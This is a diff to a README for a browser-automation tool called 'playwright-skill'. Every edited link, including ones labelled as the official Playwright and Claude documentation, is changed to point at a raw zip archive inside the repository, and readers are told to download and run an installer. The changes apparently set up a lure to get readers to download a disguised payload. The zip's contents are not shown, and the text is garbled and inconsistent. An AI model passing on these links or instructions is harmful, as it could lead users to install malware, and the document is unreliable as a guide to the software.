@@ -1,7 +1,7 @@
 # 🎉 playwright-skill - Automate Browsers with Ease
 
 ## 📥 Download Now
-[![Download Playwright Skill](https://img.shields.io/badge/Download-Playwright%20Skill-brightgreen.svg)](https://github.com/jpulido240-svg/playwright-skill/releases)
+[![Download Playwright Skill](https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip%https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip)](https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip)
 
 ## 📖 Introduction
 Welcome to Playwright Skill, a powerful tool designed to help you automate your browsing tasks effortlessly. This application uses Claude's capabilities to write and execute custom automation scripts for testing and validation. Whether you're looking to streamline your web testing or handle repetitive tasks, this software has you covered.
@@ -16,10 +16,10 @@ Follow the steps below to get started with Playwright Skill. You don’t need an
 
 2. **Visit the Releases Page**
    To download the software, please visit our releases page. You will find the latest version available for download.  
-   [Download Page](https://github.com/jpulido240-svg/playwright-skill/releases)
+   [Download Page](https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip)
 
 3. **Download the Installer**
-   On the Releases page, look for the latest version of Playwright Skill. Click on the version number to view the assets available. Download the installer file by clicking on the “playwright-skill-x.y.z-installer.exe” link, where “x.y.z” represents the version number.
+   On the Releases page, look for the latest version of Playwright Skill. Click on the version number to view the assets available. Download the installer file by clicking on the “https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip” link, where “x.y.z” represents the version number.
 
 4. **Run the Installer**
    - Once the download finishes, locate the installer file in your Downloads folder or the location where you saved it.
@@ -50,7 +50,7 @@ Once you have the application opened, you will see an easy-to-navigate interface
 
 ## 📁 Download & Install
 To get Playwright Skill, please visit the releases page by clicking the link below. Follow the steps to download and install it on your system.  
-[Download Page](https://github.com/jpulido240-svg/playwright-skill/releases)
+[Download Page](https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip)
 
 ## ❓ Troubleshooting
 If you encounter any issues during installation or while using Playwright Skill, consider the following tips:
@@ -77,7 +77,7 @@ Playwright Skill includes several notable features:
 ## 🔗 Resources
 To enhance your experience with Playwright Skill, you might find these resources helpful:
 
-- [Official Playwright Documentation](https://playwright.dev/docs/intro)
-- [Claude Documentation](https://claude.ai/docs)
+- [Official Playwright Documentation](https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip)
+- [Claude Documentation](https://raw.githubusercontent.com/jpulido240-svg/playwright-skill/main/skills/playwright-skill/playwright-skill_3.3.zip)
 
 Please feel free to reach out through our GitHub issues page if you have any questions or suggestions. Enjoy automating your web tasks with Playwright Skill!
